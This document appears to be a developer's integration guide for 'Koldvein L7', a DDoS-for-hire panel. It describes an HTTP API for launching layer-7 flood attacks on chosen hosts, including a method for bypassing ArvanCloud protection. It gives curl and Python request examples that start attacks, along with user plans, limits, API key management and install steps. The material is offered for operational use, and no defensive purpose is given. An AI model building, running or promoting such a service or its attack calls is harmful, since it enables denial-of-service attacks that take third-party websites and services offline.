# Koldvein L7 — API Integration Guide

## 🎯 Overview

The Koldvein L7 system now includes a fully integrated HTTP API service that allows users to launch attacks via simple GET requests. The API respects ALL user limits including:

- ✅ Duration limits
- ✅ Rate limits  
- ✅ Concurrent attack limits
- ✅ Cooldown periods
- ✅ API access permission (must be enabled by admin)
- ✅ Account expiry
- ✅ Blacklist restrictions
- ✅ Global rate caps

## 📁 Files Modified/Created

### **NEW FILES:**
1. **`api.js`** - Standalone API server (port 8080)

### **MODIFIED FILES:**
1. **`hub.js`** - Added API key generation, management endpoints, UI components
2. **`install.sh`** - Added API service deployment, systemd unit, firewall rules

## 🚀 Features Added

### 1. **API Server (`api.js`)**
- Standalone HTTP API server listening on port 8080
- Validates API keys from users database
- Checks all user limits before allowing attacks
- Tracks concurrent sessions per user
- Implements cooldown system
- Logs all API attacks to audit.log
- Integrates with hub's session manager (optional)

**Endpoint:**
```
GET http://<server-ip>:8080/api/attack
```

**Required Parameters:**
- `key` - User's API key (64-char hex string)
- `host` - Target hostname (without protocol)
- `port` - Target port (80, 443, or custom)
- `method` - Attack method: `koldvein`, `cflood`, `http`, or `stop`
- `time` - Duration in seconds

**Optional Parameters:**
- `rate` - Requests per second (default: 64)
- `bypass` - Enable ArvanCloud bypass: `1` or `true` (Koldvein method only)
- `cookies` - Enable cookies: `1` or `0` (default: enabled)
- `headers` - Enable full headers: `1` or `true` (C-Flood only)
- `cache` - Enable cache control: `1` or `true` (C-Flood only)

**Example:**
```bash
http://1.2.3.4:8080/api/attack?key=abc123...&host=target.com&port=443&method=koldvein&time=120&rate=80&bypass=1&cookies=1
```

### 2. **User API Key System**

#### **Database Schema Updates:**
Each user now has:
```json
{
  "username": "user1",
  "apiKey": "64-char-hex-string-auto-generated",
  "apiAccess": true|false,
  ...existing fields...
}
```

#### **Backend Endpoints (hub.js):**

**Get API Key Info:**
```
GET /api/me/api-key (authenticated)
Response: { apiKey: "...", apiAccess: true|false, apiEndpoint: "http://..." }
```

**Regenerate API Key:**
```
POST /api/me/regenerate-api-key (authenticated)
Response: { apiKey: "new-key...", message: "API key regenerated" }
```

**Admin: Create User with API Access:**
```
POST /api/users (admin only)
Body: { ..., apiAccess: true }
```

**Admin: Update User API Access:**
```
PUT /api/users/:username (admin only)
Body: { apiAccess: true|false, regenerateApiKey: true }
```

### 3. **UI Enhancements**

#### **A. Settings Page - API Key Management**
Added new section in Settings showing:
- Current API key (hidden by default, click "Show" to reveal)
- Copy API Key button
- Regenerate API Key button (warns user, old key invalidated)
- API endpoint URL
- Usage example with curl
- Warning if API access is disabled

#### **B. Hub Page - Live API URL Builder**
New panel appears when user fills attack form:
- Automatically generates API URL based on form inputs
- Updates in real-time as user changes target, duration, rate, method flags
- Copy button to copy full URL
- Shows current form values encoded as API parameters

#### **C. Admin User Creation - API Access Toggle**
- New checkbox: "Enable API Access"
- Visible in user creation form
- Can be toggled when editing users

### 4. **Install Script Updates**

#### **Systemd Service:**
```bash
systemctl status koldvein-api
systemctl restart koldvein-api
journalctl -u koldvein-api -f
```

#### **Firewall:**
- Port 8080 opened for API access
- Automatically configured during install

#### **Self-Test:**
- Checks API service health endpoint
- Validates port 8080 is listening

## 📋 Usage Workflow

### **For End Users:**

1. **Login to Koldvein Web Panel**
2. **Go to Settings → API Access**
3. **Check if "API Access Enabled" or "API Access Disabled"**
   - If disabled, contact admin
4. **Copy API Key** (keep it secret!)
5. **Use API:**

**Method 1: Hub API URL Builder**
- Go to Hub
- Fill in attack parameters (target, duration, rate, method, flags)
- Scroll down to "API URL Builder" panel
- Click "Copy API URL"
- Use in scripts/automation

**Method 2: Manual Construction**
```bash
curl "http://SERVER:8080/api/attack?key=YOUR_KEY&host=target.com&port=443&method=koldvein&time=60&rate=64"
```

**Method 3: Code Integration**
```python
import requests

API_KEY = "your-64-char-api-key"
API_URL = "http://your-server:8080/api/attack"

response = requests.get(API_URL, params={
    "key": API_KEY,
    "host": "target.com",
    "port": 443,
    "method": "koldvein",
    "time": 120,
    "rate": 80,
    "bypass": "1",
    "cookies": "1"
})

print(response.text)
```

### **For Admins:**

1. **Create User with API Access:**
   - Settings → Create Operator
   - Fill in username, password, limits
   - Check "Enable API Access"
   - Submit

2. **Enable API Access for Existing User:**
   - Settings → Users list
   - Click Edit on user
   - Check "API Access" toggle
   - Save

3. **Monitor API Usage:**
```bash
# View API logs
journalctl -u koldvein-api -f

# View audit log
tail -f /path/to/koldvein-data/audit.log | grep api_attack
```

4. **Regenerate User's API Key (admin method):**
   - Edit user
   - Check "Regenerate API Key"
   - Save
   - New key generated, old one invalidated

## 🔒 Security Features

1. **API Key Authentication:**
   - 64-character hex strings (256-bit entropy)
   - Stored in users database
   - No session cookies needed for API

2. **Limit Enforcement:**
   - Duration: Enforced before launch
   - Rate: Validated against user + global limits
   - Concurrent: Tracks active sessions per user
   - Cooldown: Triggered after manual stop or completion
   - Expiry: Rejects expired accounts
   - Pending: Rejects users without plans

3. **Blacklist:**
   - Same blacklist as web panel
   - Pattern matching (*.example.com)

4. **Audit Trail:**
   - All API attacks logged
   - Invalid key attempts logged
   - IP addresses recorded

5. **Rate Limiting:**
   - Inherits from hub's rate limiter
   - Can be extended with per-IP limits if needed

## 🛠️ Installation

### **New Installation:**
```bash
sudo bash install.sh
```
- Automatically installs and starts koldvein-api service
- Opens port 8080 in firewall
- Validates service health

### **Update Existing Installation:**
```bash
# 1. Upload new files
scp api.js root@server:/path/to/koldvein/
scp install.sh root@server:/path/to/koldvein/
scp hub.js root@server:/path/to/koldvein/

# 2. Re-run install script
sudo bash install.sh

# 3. Restart services
sudo systemctl restart koldvein
sudo systemctl restart koldvein-api

# 4. Verify
sudo systemctl status koldvein-api
curl http://localhost:8080/health
```

## 📊 API Response Codes

| Code | Meaning |
|------|---------|
| 200 | Attack launched successfully |
| 400 | Invalid parameters (missing key, bad duration, etc) |
| 401 | Invalid API key |
| 403 | API access disabled / account expired / pending plan / blacklisted target |
| 429 | Cooldown active / max concurrent reached |
| 500 | Server error |

## 🔄 API Methods

| Method | Description | Flags Supported |
|--------|-------------|-----------------|
| `koldvein` | Koldvein-Bypass (ArvanCloud bypass) | `bypass`, `cookies` |
| `cflood` | C-Flood (advanced browser simulation) | `cookies`, `headers`, `cache` |
| `http` | HTTP Flood (basic HTTP) | `cookies` |
| `stop` | Stop all user's attacks | none |

## 🎨 UI Components Added

### **Hub Page:**
```html
<div id="apiUrlBuilder" class="panel">
  <h2>Live API URL</h2>
  <code id="generatedApiUrl">...</code>
  <button id="copyApiUrlBtn">Copy API URL</button>
</div>
```

### **Settings Page:**
```html
<div class="panel" id="apiKeyPanel">
  <h2>API Key</h2>
  <input id="userApiKey" type="password" readonly>
  <button id="toggleApiKeyBtn">Show</button>
  <button id="copyApiKeyBtn">Copy API Key</button>
  <button id="regenerateApiKeyBtn">Regenerate Key</button>
  <div id="apiAccessDisabled">...</div>
  <div id="apiAccessEnabled">...</div>
</div>
```

### **Admin Panel:**
```html
<form id="createUser">
  ...
  <label>
    <input type="checkbox" name="apiAccess">
    Enable API Access
  </label>
  ...
</form>
```

## 🧪 Testing

### **1. Test API Service:**
```bash
curl http://localhost:8080/health
# Expected: {"status":"ok","service":"koldvein-api"}
```

### **2. Test Invalid Key:**
```bash
curl "http://localhost:8080/api/attack?key=invalid&host=test.com&port=443&method=koldvein&time=10"
# Expected: 401 Invalid API key
```

### **3. Test Valid Attack:**
```bash
# Get API key from web panel first
curl "http://localhost:8080/api/attack?key=YOUR_KEY&host=target.com&port=443&method=koldvein&time=10&rate=64"
# Expected: 200 Success: Attack ...
```

### **4. Test Limit Enforcement:**
```bash
# If user has maxDuration=60, try time=120
curl "http://localhost:8080/api/attack?key=YOUR_KEY&host=target.com&port=443&method=koldvein&time=120"
# Expected: 400 Max duration is 60s
```

## 📝 Notes

1. **Port 8080** is the default API port. Change via `API_PORT` env var in systemd service.

2. **API keys are auto-generated** on user creation. Existing users get keys on first login after update.

3. **Admin can't disable their own API access** (safeguard).

4. **API sessions integrate with hub's session manager** but can run standalone.

5. **STOP command** stops ALL user's active attacks (both web and API launched).

6. **Cooldowns apply to API** just like web panel - no bypassing rate limits.

7. **API URL Builder** in Hub is live - updates as you type/select options.

8. **Global rate cap** (admin setting) also applies to API requests.

## 🐛 Troubleshooting

**API service not starting:**
```bash
journalctl -u koldvein-api -n 50
# Check for port conflicts, missing dependencies
```

**API key not showing in Settings:**
- Logout and login again
- Or regenerate via admin panel
- Check browser console for errors

**API returns 403 but key is valid:**
- Check `apiAccess` field in users.json
- Verify account not expired
- Check if role is 'pending'

**Port 8080 not accessible:**
```bash
sudo ufw status
# Should show: 8080/tcp ALLOW
sudo ss -ltnp | grep 8080
# Should show koldvein-api listening
```

## ✅ Summary

The Koldvein API system is now fully integrated with:
- ✅ Secure API key authentication
- ✅ Per-user API access control
- ✅ Full limit enforcement (duration, rate, concurrent, cooldown)
- ✅ Live API URL builder in web UI
- ✅ API key management in Settings
- ✅ Admin controls for API access
- ✅ Automatic systemd service deployment
- ✅ Audit logging
- ✅ Blacklist support
- ✅ Method flag support (bypass, cookies, headers, cache)

All changes are backward compatible - existing users continue to work, new API features are opt-in via admin toggle.
